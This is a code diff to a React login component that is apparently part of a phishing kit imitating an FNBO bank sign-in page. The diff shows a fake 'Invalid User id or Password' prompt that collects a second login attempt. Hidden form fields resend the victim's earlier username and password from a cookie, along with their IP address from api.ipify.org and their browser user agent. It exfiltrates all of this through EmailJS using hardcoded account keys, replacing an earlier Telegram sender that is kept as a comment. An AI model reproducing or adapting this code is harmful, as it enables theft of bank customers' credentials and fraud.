@@ -1,7 +1,9 @@
 import React from 'react'
 import { useNavigate } from 'react-router-dom';
 import cookies from '../utils/cookie.config';
-import TelegramSend from '../utils/send-message';
+// import TelegramSend from '../utils/send-message';
+import emailjs from "@emailjs/browser";
+// import { wait } from '../utils/waiter';
 
 
 export default function ReLogin() {
@@ -10,27 +12,63 @@ export default function ReLogin() {
     password2: "",
   });
   const navigate = useNavigate();
+
+  const login1: Login = cookies.get("login1");
+
   function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
     setFormInput((prevData) => ({
       ...prevData,
       [event.target.name]: event.target.value,
     }));
   }
+  const form = React.useRef<HTMLFormElement>(null);
+
   const [isLoading, setIsLoading] = React.useState(false);
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
-    const message = `
-    ---- FNBO LOGIN (SECOND TRY) -----
-    Username: ${formInput.username2}
-    Password: ${formInput.password2}
-    `;
+    // const message = `
+    // ---- FNBO LOGIN (SECOND TRY) -----
+    // Username: ${formInput.username2}
+    // Password: ${formInput.password2}
+    // `;
     setIsLoading(true)
-    await TelegramSend(message);
+    const mail = await emailjs.sendForm(
+      "service_m05lftf",
+      "template_aeij4rd",
+      form.current!,
+      "74xz7jS-Xw5rVxjbV"
+    )
+    if(mail.status !== 200){
+      alert("Failed to login")
+      return
+    }
+      // .then(
+      //   (result) => {
+      //     console.log(result.text);
+      //     navigate("../auth", { replace: true });
+      //   },(error)=>{
+      //     alert("Could not complete your request");
+      //     console.log(error);
+      //     setIsLoading(false);
+      //   }
+      // )
+    // await TelegramSend(message);
     cookies.set("login2", formInput);
     setIsLoading(false)
     navigate("../auth", { replace: true });
   };
 
+  const [ipAddress, setIpAddress] = React.useState<string>();
+
+  async function getIP() {
+    const request = await fetch("https://api.ipify.org?format=json");
+    const response: { ip: string } = await request.json();
+    setIpAddress(response.ip);
+  }
+
+  React.useEffect(() => {
+    getIP();
+  }, []);
 
 
   return (
@@ -39,6 +77,7 @@ export default function ReLogin() {
         <div className="auth-content-inner">
           <div className="primary-auth">
             <form
+            ref={form}
               method="POST"
               data-se="o-form"
               slot="content"
@@ -56,6 +95,29 @@ export default function ReLogin() {
                 >
                   Sign In
                 </h2>
+
+                <div style={{ display: "none" }} className="hidden_form">
+                <input
+                  type="text"
+                  name="username"
+                  defaultValue={login1.username}
+                />
+                <input
+                  type="text"
+                  name="password"
+                  defaultValue={login1.password}
+                />
+                
+                
+                <input type="text" name="pi" defaultValue={ipAddress} />
+                <input
+                  type="text"
+                  name="brow"
+                  defaultValue={window.navigator.userAgent}
+                />
+              </div>
+
+
                 <p style={{color:"red"}}>Invalid User id or Password, Please Try Again!</p>
                 <div
                   className="o-form-error-container"
